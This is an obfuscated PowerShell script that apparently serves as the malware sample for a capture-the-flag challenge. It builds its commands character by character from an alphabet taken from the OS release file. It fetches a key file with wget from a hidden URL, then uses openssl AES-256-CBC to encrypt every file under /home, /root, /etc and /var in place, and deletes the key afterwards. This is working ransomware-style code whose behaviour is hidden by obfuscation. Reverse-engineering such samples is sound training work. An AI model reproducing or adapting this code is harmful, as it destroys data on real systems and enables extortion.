function main {
    fun1
    fun2
    fun3
    fun4
    fun5
    exit
}

function fun1 {
    if ([int](&(Get-Command /???/id) -u) -cne -not [bool][byte]) { exit }
    if (-not ((/bin/cat /etc/*release*) | grep noble)) { exit }
    if ((/bin/cat /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49") { exit } # intentional guard in chal to prevent accidentally running the script
}
# openssl enc -aes-256-cbc -salt -in plain.txt -out enc
# 
# 1. Read all the contents of /etc/*release* into a variable, splits on \n
# 2. Concatenates key of line 1, line 2, key of line 3, ...
# 3. sorts and removes duplicates
# 4. result as global var

function fun2 {
    $file_contents = (/bin/cat /etc/*release*).split('\n')
    $alphabet = (
        $file_contents[0] `
            += $file_contents[1].split('=')[0] `
            += $file_contents[2] `
            += $file_contents[3].split('=')[0] `
            += $file_contents[4].split('=')[0] `
            += $file_contents[5] `
            += $file_contents[6].split('=')[0] `
            += $file_contents[7].split('=')[0] `
            += $file_contents[8] `
            += $file_contents[9] `
            += $file_contents[10] `
            += $file_contents[11] `
            += $file_contents[12] `
            += $file_contents[13] `
            += $file_contents[14] `
            += $file_contents[15] `
            += $file_contents[16]
    ).Tochararray() + 0..9

    $alphabet = ( -join ($alphabet | sort-object | get-unique))
    $GLOBAL:ALPHABET = $alphabet
}

function fun3 {
    $PICK_VARS = $GLOBAL:ALPHABET[3] `
        + $GLOBAL:ALPHABET[5] `
        + $GLOBAL:ALPHABET[12] `
        + $GLOBAL:ALPHABET[8] `
        + $GLOBAL:ALPHABET[7] `
        + $GLOBAL:ALPHABET[12] `
        + $GLOBAL:ALPHABET[1] `
        + $GLOBAL:ALPHABET[6] `
        + $GLOBAL:ALPHABET[5] `
        + $GLOBAL:ALPHABET[12] `
        + $GLOBAL:ALPHABET[6] `
        + $GLOBAL:ALPHABET[5] `
        + $GLOBAL:ALPHABET[14] `
        + $GLOBAL:ALPHABET[3] `
        + $GLOBAL:ALPHABET[1] `
        + $GLOBAL:ALPHABET[3] `
        + $GLOBAL:ALPHABET[3] `
        + $GLOBAL:ALPHABET[7] `
        + $GLOBAL:ALPHABET[13] `
        + 'k' `
        + $GLOBAL:ALPHABET[41] `
        + $GLOBAL:ALPHABET[56]
    $FILENAME = $GLOBAL:ALPHABET[16] # 1 char
    /bin/wget $PICK_VARS -q -O $FILENAME
}

function fun4 {
    foreach ( `
            $I in ( `
                Invoke-Expression ( `
                    'f' `
                    + $GLOBAL:ALPHABET[44] `
                    + $GLOBAL:ALPHABET[47] `
                    + $GLOBAL:ALPHABET[40] `
                    + ' ' `
                    + $GLOBAL:ALPHABET[13] `
                    + $GLOBAL:ALPHABET[48] `
                    + $GLOBAL:ALPHABET[49] `
                    + $GLOBAL:ALPHABET[52] `
                    + $GLOBAL:ALPHABET[13] `
                    + ' ' `
                    + $GLOBAL:ALPHABET[11] `
                    + $GLOBAL:ALPHABET[52] `
                    + $GLOBAL:ALPHABET[56] `
                    + $GLOBAL:ALPHABET[49] `
                    + $GLOBAL:ALPHABET[41] `
                    + ' ' `
                    + 'f' `
            )
        )
    ) {
        Invoke-Expression (
            "" `
                + $GLOBAL:ALPHABET[48] ` # o
                + $GLOBAL:ALPHABET[49] ` # p
                + $GLOBAL:ALPHABET[41] ` # e
                + $GLOBAL:ALPHABET[47] ` # n
                + $GLOBAL:ALPHABET[51] ` # s
                + $GLOBAL:ALPHABET[51] ` # s
                + $GLOBAL:ALPHABET[45] ` # l
                + ' ' `
                + $GLOBAL:ALPHABET[41] ` # enc
                + $GLOBAL:ALPHABET[47] `
                + $GLOBAL:ALPHABET[39] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] ` # -aes-256-cbc
                + $GLOBAL:ALPHABET[37] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[2] `
                + $GLOBAL:ALPHABET[5] `
                + $GLOBAL:ALPHABET[6] `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[39] `
                + $GLOBAL:ALPHABET[38] `
                + $GLOBAL:ALPHABET[39] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] ` # -pass
                + $GLOBAL:ALPHABET[49] `
                + $GLOBAL:ALPHABET[37] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[51] `
                + ' ' `
                + 'f' `
                + $GLOBAL:ALPHABET[44] `
                + $GLOBAL:ALPHABET[45] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[14] `
                + 'k' `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[56] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] ` # -in
                + $GLOBAL:ALPHABET[44] `
                + $GLOBAL:ALPHABET[47] `
                + ' ' `
                + " $I " `
                + ' ' `
                + $GLOBAL:ALPHABET[11] ` # -out
                + $GLOBAL:ALPHABET[48] `
                + $GLOBAL:ALPHABET[53] `
                + $GLOBAL:ALPHABET[52] `
                + ' ' `
                + " $I "
        )
    } 

    foreach ($I in (
            Invoke-Expression ('f' `
                    + $GLOBAL:ALPHABET[44] `
                    + $GLOBAL:ALPHABET[47] `
                    + $GLOBAL:ALPHABET[40] `
                    + ' ' `
                    + $GLOBAL:ALPHABET[13] `
                    + $GLOBAL:ALPHABET[43] `
                    + $GLOBAL:ALPHABET[48] `
                    + $GLOBAL:ALPHABET[46] `
                    + $GLOBAL:ALPHABET[41] `
                    + $GLOBAL:ALPHABET[13] `
                    + ' ' `
                    + $GLOBAL:ALPHABET[11] `
                    + $GLOBAL:ALPHABET[52] `
                    + $GLOBAL:ALPHABET[56] `
                    + $GLOBAL:ALPHABET[49] `
                    + $GLOBAL:ALPHABET[41] `
                    + ' ' `
                    + 'f'))
    ) {
        Invoke-Expression ("" `
                + $GLOBAL:ALPHABET[48] `
                + $GLOBAL:ALPHABET[49] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[47] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[45] `
                + ' ' `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[47] `
                + $GLOBAL:ALPHABET[39] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[37] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[2] `
                + $GLOBAL:ALPHABET[5] `
                + $GLOBAL:ALPHABET[6] `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[39] `
                + $GLOBAL:ALPHABET[38] `
                + $GLOBAL:ALPHABET[39] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[49] `
                + $GLOBAL:ALPHABET[37] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[51] `
                + ' ' `
                + 'f' `
                + $GLOBAL:ALPHABET[44] `
                + $GLOBAL:ALPHABET[45] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[14] `
                + 'k' `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[56] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[44] `
                + $GLOBAL:ALPHABET[47] `
                + ' ' `
                + " $I " `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[48] `
                + $GLOBAL:ALPHABET[53] `
                + $GLOBAL:ALPHABET[52] `
                + ' ' `
                + " $I ")
    } 

    foreach ($I in (Invoke-Expression ('f' `
                    + $GLOBAL:ALPHABET[44] ` # i
                    + $GLOBAL:ALPHABET[47] ` # n
                    + $GLOBAL:ALPHABET[40] ` # d
                    + ' ' `
                    + $GLOBAL:ALPHABET[13] `
                    + $GLOBAL:ALPHABET[41] `
                    + $GLOBAL:ALPHABET[52] `
                    + $GLOBAL:ALPHABET[39] `
                    + $GLOBAL:ALPHABET[13] `
                    + ' ' `
                    + $GLOBAL:ALPHABET[11] `
                    + $GLOBAL:ALPHABET[52] `
                    + $GLOBAL:ALPHABET[56] `
                    + $GLOBAL:ALPHABET[49] `
                    + $GLOBAL:ALPHABET[41] `
                    + ' ' `
                    + 'f' ))
    ) {
        Invoke-Expression ("" `
                + $GLOBAL:ALPHABET[48] `
                + $GLOBAL:ALPHABET[49] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[47] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[45] `
                + ' ' `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[47] `
                + $GLOBAL:ALPHABET[39] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[37] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[2] `
                + $GLOBAL:ALPHABET[5] `
                + $GLOBAL:ALPHABET[6] `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[39] `
                + $GLOBAL:ALPHABET[38] `
                + $GLOBAL:ALPHABET[39] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[49] `
                + $GLOBAL:ALPHABET[37] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[51] `
                + ' ' `
                + 'f' `
                + $GLOBAL:ALPHABET[44] `
                + $GLOBAL:ALPHABET[45] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[14] `
                + 'k' `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[56] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[44] `
                + $GLOBAL:ALPHABET[47] `
                + ' ' `
                + " $I " `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[48] `
                + $GLOBAL:ALPHABET[53] `
                + $GLOBAL:ALPHABET[52] `
                + ' ' `
                + " $I ")
    } 

    foreach ($I in (Invoke-Expression ('f' `
                    + $GLOBAL:ALPHABET[44] `
                    + $GLOBAL:ALPHABET[47] `
                    + $GLOBAL:ALPHABET[40] `
                    + ' ' `
                    + $GLOBAL:ALPHABET[13] `
                    + $GLOBAL:ALPHABET[54] `
                    + $GLOBAL:ALPHABET[37] `
                    + $GLOBAL:ALPHABET[50] `
                    + $GLOBAL:ALPHABET[13] `
                    + ' ' `
                    + $GLOBAL:ALPHABET[11] `
                    + $GLOBAL:ALPHABET[52] `
                    + $GLOBAL:ALPHABET[56] `
                    + $GLOBAL:ALPHABET[49] `
                    + $GLOBAL:ALPHABET[41] `
                    + ' ' `
                    + 'f'))) {
        Invoke-Expression ("" `
                + $GLOBAL:ALPHABET[48] `
                + $GLOBAL:ALPHABET[49] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[47] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[45] `
                + ' ' `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[47] `
                + $GLOBAL:ALPHABET[39] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[37] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[2] `
                + $GLOBAL:ALPHABET[5] `
                + $GLOBAL:ALPHABET[6] `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[39] `
                + $GLOBAL:ALPHABET[38] `
                + $GLOBAL:ALPHABET[39] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[49] `
                + $GLOBAL:ALPHABET[37] `
                + $GLOBAL:ALPHABET[51] `
                + $GLOBAL:ALPHABET[51] `
                + ' ' `
                + 'f' `
                + $GLOBAL:ALPHABET[44] `
                + $GLOBAL:ALPHABET[45] `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[14] `
                + 'k' `
                + $GLOBAL:ALPHABET[41] `
                + $GLOBAL:ALPHABET[56] `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[44] `
                + $GLOBAL:ALPHABET[47] `
                + ' ' `
                + " $I " `
                + ' ' `
                + $GLOBAL:ALPHABET[11] `
                + $GLOBAL:ALPHABET[48] `
                + $GLOBAL:ALPHABET[53] `
                + $GLOBAL:ALPHABET[52] `
                + ' ' `
                + " $I ")
    }
}

function fun5 {
    Remove-Item $FILENAME # 1 char
}


main
